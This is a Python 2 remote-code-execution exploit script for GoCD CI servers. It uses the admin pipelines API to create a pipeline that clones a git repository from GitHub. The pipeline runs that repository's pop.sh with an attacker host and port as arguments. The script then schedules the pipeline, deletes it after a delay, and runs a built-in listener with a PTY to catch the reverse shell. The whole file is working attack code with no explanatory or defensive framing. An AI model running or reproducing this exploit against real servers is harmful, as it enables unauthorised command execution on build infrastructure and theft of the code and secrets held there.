#!/usr/bin/env python2

import random
import signal
import termios
import select
import socket
import os
import fcntl
import sys
import string
import requests
import time

from requests import post, delete
from multiprocessing import Process

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"

    try:
        cleanup_payload()
    except:
        pass

    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def setup_payload():

    data = '''{"group":"first","pipeline":{"label_template":"${COUNT}","lock_behavior":"lockOnFailure",\
    "name":"%s","template":null,"materials":[{"type":"git","attributes":{"url":"https://github.com/mikaelkall/gocdrce_helper.git",\
    "destination":"dest","filter":null,"invert_filter":false,"name":null,"auto_update":false,"branch":"master","submodule_folder":null,\
    "shallow_clone":true}}],"stages":[{"name":"defaultStage","fetch_materials":true,"clean_working_directory":true,"never_cleanup_artifacts":false,\
    "approval":{"type":"success","authorization":{"roles":[],"users":[]}},"environment_variables":[],"jobs":[{"name":"defaultJob","run_instance_count":null,\
    "timeout":0,"environment_variables":[],"resources":[],"tasks":[{"type":"exec","attributes":{"run_if":["passed"],\
    "command":"dest/pop.sh","arguments":["%s","%s"],"working_directory":null}}]}]}]}}''' % (PIPELINENAME, LHOST, LPORT)

    headers = {'Accept': 'application/vnd.go.cd.v5+json',
               'Content-Type': 'application/json'}

    host = 'https://%s:8154/go/api/admin/pipelines' % HOST

    if len(USERNAME) == 0 or len(PASSWORD) == 0:
        submit = post(host, data=data, headers=headers, verify=False)
    else:
        submit = post(host, data=data, headers=headers, verify=False, auth=(USERNAME, PASSWORD))

    if submit.status_code == 200:
        print("[+] Payload")
    else:
        print("[-] Payload")

    time.sleep(2)

    host = 'https://%s:8154/go/api/pipelines/%s/unpause' % (HOST, PIPELINENAME)

    headers = {'Accept': 'application/vnd.go.cd.v1+json',
               'Content-Type': 'application/json'}

    if len(USERNAME) == 0 or len(PASSWORD) == 0:
        submit = post(host, data=data, headers=headers, verify=False)
    else:
        submit = post(host, data=data, headers=headers, verify=False, auth=(USERNAME, PASSWORD))

    if submit.status_code == 200:
        print("[+] Payload")
    else:
        print("[-] Payload")


def cleanup_payload():

    headers = {'Accept': 'application/vnd.go.cd.v5+json'}
    host = 'https://%s:8154/go/api/admin/pipelines/%s' % (HOST, PIPELINENAME)

    if len(USERNAME) == 0 or len(PASSWORD) == 0:
        submit = delete(host, headers=headers, verify=False)
    else:
        submit = delete(host, headers=headers, verify=False, auth=(USERNAME, PASSWORD))


def cleanup_payload_timer():
    time.sleep(120)
    cleanup_payload()


def exploit():

    time.sleep(2)

    headers = {'Accept': 'application/vnd.go.cd.v1+json',
               'Content-Type': 'application/json',
               'X-GoCD-Confirm': 'random'}

    host = 'https://%s:8154/go/api/pipelines/%s/schedule' % (HOST, PIPELINENAME)

    if len(USERNAME) == 0 or len(PASSWORD) == 0:
        submit = post(host, headers=headers, verify=False)
    else:
        submit = post(host, headers=headers, verify=False, auth=(USERNAME, PASSWORD))

    print("[+] Exploit")

if __name__ == '__main__':

    if len(sys.argv) < 4:
        print "Usage: %s <HOST> <LHOST> <LPORT> [USERNAME] [PASSWORD]" % (sys.argv[0])
        print "\nEXAMPLE: ./gocd_rce.py '127.0.0.1' 10.10.14.24 1337 admin password\n"
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    try:
        USERNAME = sys.argv[4]
        PASSWORD = sys.argv[5]
    except:
        USERNAME = ''
        PASSWORD = ''

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    # Generate random string as pipelinename
    PIPELINENAME = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

    setup_payload()

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    # Cleanup payload
    p = Process(target=cleanup_payload_timer)
    p.start()

    time.sleep(4)
    print("[*] Waiting for agent to schedule payload, note this can take some time..")
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
